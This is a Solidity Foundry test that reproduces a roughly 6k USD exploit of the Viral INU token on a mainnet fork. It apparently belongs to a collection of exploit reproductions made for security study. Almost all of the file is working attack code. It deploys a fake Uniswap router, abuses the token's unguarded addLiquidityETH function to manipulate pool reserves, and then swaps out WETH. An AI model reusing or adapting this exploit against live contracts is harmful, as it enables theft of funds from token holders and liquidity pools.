// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
// @KeyInfo - Total Lost : ~6k USD$
// Attacker : https://etherscan.io/address/0x9748c8540a5f752ba747f1203ac13dae789033de
// Attack Contract : https://etherscan.io/address/0xf73b8ea8838cba9148fb182e267a000f7cfba8dd
// Attack Tx : https://etherscan.io/tx/0xaf46a42fe1ed7193b25c523723dc047c7500e50a00ecb7bbb822d665adb3e1f3

// @Analysis
// https://twitter.com/hexagate_/status/1666051854386511873?cxt=HHwWgoC24bPVgJ8uAAAA

interface IVINU is IERC20 {

    function addLiquidityETH(address routerAddr, address lprAddr, address devAddr) external;

}

contract VinuTest is Test {

    // Viral INU token
    IVINU VINU = IVINU(0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Router UniswapV2Router02 = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IUniswapV2Pair Pair = IUniswapV2Pair(0xa8AF8ac7aCd97095c0d73eD51E30564d52b19cd8);
    address private constant flashbotsAddress = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;
    Router FakeRouter;

    function setUp() public {
        deal(address(this), 0.5 ether);
        vm.createSelectFork("mainnet", 17_421_006);
        vm.label(address(VINU), "VINU");
        vm.label(address(WETH), "WETH");
        vm.label(address(UniswapV2Router02), "UniswapV2Router02");
        vm.label(flashbotsAddress, "flashbotsAddress");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker's contract ETH balance before attack", address(this).balance, 18);

        emit log_named_decimal_uint(
            "Attacker's contract WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
        );

        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(VINU);
        UniswapV2Router02.swapExactETHForTokens{value: 0.1 ether}(0, path, address(this), block.timestamp + 100);

        // Deploying fake Router contract
        FakeRouter = new Router();

        // Manipulating the price of VINU
        for (uint256 i; i < 4; ++i) {
            VINU.addLiquidityETH(address(FakeRouter), address(this), address(Pair));
        }
        Pair.sync();
        uint256 amountIn = VINU.balanceOf(address(this));
        VINU.transfer(address(Pair), VINU.balanceOf(address(this)));

        (uint112 reserveWETH, uint112 reserveVINU,) = Pair.getReserves();
        (bool success3,) = flashbotsAddress.call{value: 0.000000001 ether}("");
        uint256 amountOut = UniswapV2Router02.getAmountOut(amountIn, reserveVINU, reserveWETH);

        Pair.swap(amountOut, 0, address(this), "");

        emit log_named_decimal_uint("Attacker's contract ETH balance after attack", address(this).balance, 18);

        emit log_named_decimal_uint(
            "Attacker's contract WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

}

contract Router {

    address private constant wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function factory() external view returns (address) {
        return address(this);
    }

    function WETH() external pure returns (address) {
        return wethAddr;
    }

    function approve(address spender, uint256 amount) external pure returns (bool) {
        return true;
    }

    function createPair(address tokenA, address tokenB) external view returns (address) {
        return address(this);
    }

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external pure returns (uint256 amountA, uint256 amountB, uint256 liquidity) {
        return (0, 0, 0);
    }

}
